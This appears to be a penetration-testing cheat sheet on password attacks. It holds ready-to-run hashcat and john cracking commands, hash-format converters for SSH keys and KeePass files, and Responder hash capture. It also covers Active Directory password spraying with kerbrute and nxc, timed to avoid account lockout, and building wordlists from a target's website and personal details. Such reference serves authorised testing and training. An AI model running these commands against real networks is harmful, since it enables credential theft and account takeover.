# Passwords & Cracking — [Back to Main](../README.md)

## Hash Identification

```bash
hashid '<hash>'
hash-identifier   # interactive
```

| Hash | Length / Pattern | Hashcat Mode |
|---|---|---|
| MD5 | 32 hex | 0 |
| SHA1 | 40 hex | 100 |
| SHA256 | 64 hex | 1400 |
| SHA512 | 128 hex | 1700 |
| NTLM | 32 hex (Windows) | 1000 |
| NTLMv1 | `user::domain:...` | 5500 |
| NTLMv2 | `user::domain:...` (longer) | 5600 |
| bcrypt | `$2a$` / `$2b$` / `$2y$` | 3200 |
| md5crypt | `$1$` (Linux/Cisco) | 500 |
| sha256crypt | `$5$` (Linux shadow) | 7400 |
| sha512crypt | `$6$` (Linux shadow) | 1800 |
| Kerberos TGS (Kerberoast) | `$krb5tgs$23$...` | 13100 |
| Kerberos AS-REP | `$krb5asrep$23$...` | 18200 |
| WPA2 | `.hccapx` / `.22000` | 22000 |

## hashcat

```bash
# Syntax: hashcat -m <mode> <hashfile> <wordlist>
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt

# With rules (dramatically increases coverage)
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# Mask attack (brute force with pattern)
# Charset: ?l=lower ?u=upper ?d=digit ?s=special ?a=all printable
hashcat -m 1000 ntlm.txt -a 3 ?u?l?l?l?l?d?d      # e.g. Password12
hashcat -m 1000 ntlm.txt -a 3 -i --increment-min=4 --increment-max=8 ?a?a?a?a?a?a?a?a

# Combination attack (word1+word2)
hashcat -m 1000 ntlm.txt -a 1 wordlist1.txt wordlist2.txt

# Show cracked results
hashcat -m 1000 ntlm.txt --show
```

## john

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked
john hash.txt --show

# Rules
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64
```

### Convert formats for john

```bash
ssh2john id_rsa > id_rsa.hash
zip2john archive.zip > zip.hash
rar2john archive.rar > rar.hash
keepass2john Database.kdbx > keepass.hash
pdf2john document.pdf > pdf.hash
office2john document.docx > office.hash

john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

## Credential Spraying (Active Directory)

```bash
# Username enumeration via Kerberos (no lockout risk, doesn't need creds)
kerbrute userenum --dc $DC_IP -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Password spray — ONE password at a time to avoid lockout
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123!'
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Welcome1'

# nxc spray across subnet
nxc smb $IP -u users.txt -p 'Password123!' --continue-on-success
nxc smb $IP -u users.txt -p passwords.txt --no-bruteforce   # pairs: user[0]:pass[0]

# Check for empty/blank passwords
nxc smb $IP -u users.txt -p ''
```

> Check password policy before spraying: `nxc smb $IP -u user -p pass --pass-pol`
> Default AD lockout is often 5 attempts. Spray ≤3 times then wait.

## NetNTLM Capture (Responder)

```bash
# Capture NTLMv2 hashes from authentication attempts on the network
responder -I eth0 -wd

# Hashes saved to /usr/share/responder/logs/
# Crack with:
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

## Custom Wordlist Generation

```bash
# Site-specific words from target web content
cewl http://$IP -m 5 -w cewl.txt
cewl http://$IP -m 5 --with-numbers -w cewl.txt   # include words with numbers

# Username-based password mutation (common enterprise pattern)
# E.g., target org named "CORP", user "jsmith" → passwords: Corp2024!, Jsmith1, etc.

# Hashcat rules — dramatically expand base wordlist coverage
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Combine cewl output with rules
hashcat -m 1000 hashes.txt cewl.txt -r /usr/share/hashcat/rules/best64.rule

# CUPP — Common User Passwords Profiler (generates personalized wordlist)
cupp -i   # interactive mode — prompts for target info (name, DOB, pet, etc.)

# Mentalist — GUI wordlist builder with pattern-based mutations
# https://github.com/sc0tfree/mentalist
```

## Password Spray — Timing & Lockout

```bash
# ALWAYS check lockout policy before spraying
nxc smb $DC_IP -u '' -p '' --pass-pol
nxc smb $DC_IP -u guest -p '' --pass-pol

# Lockout threshold: 5 attempts → spray ≤ 3 passwords, then wait > observation window
# Typical observation window: 30 minutes
# Spray cadence: 1 password per 30-60 minutes against 5-attempt lockout

# Track attempts to avoid re-spraying same account
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123!' 2>&1 | tee spray_1.txt
# Wait 30+ min
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Welcome1!' 2>&1 | tee spray_2.txt

# Seasonal patterns — high-hit passwords by quarter
# Q1: Company2024!, Company2024$
# Common: Password1, Welcome1, Summer2024!, Winter2024!
# On AD: <CompanyName>1, <Season><Year>!
```

## Wordlists

| Wordlist | Use |
|---|---|
| `/usr/share/wordlists/rockyou.txt` | General purpose |
| `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt` | Fast spray |
| `/usr/share/seclists/Passwords/Default-Credentials/` | Default service creds |
| `/usr/share/seclists/Passwords/Leaked-Databases/` | Breach-derived lists |
| `cewl http://$IP -m 5 -w cewl.txt` | Site-specific words |
| `cupp -i` | Target-profiled personalized list |
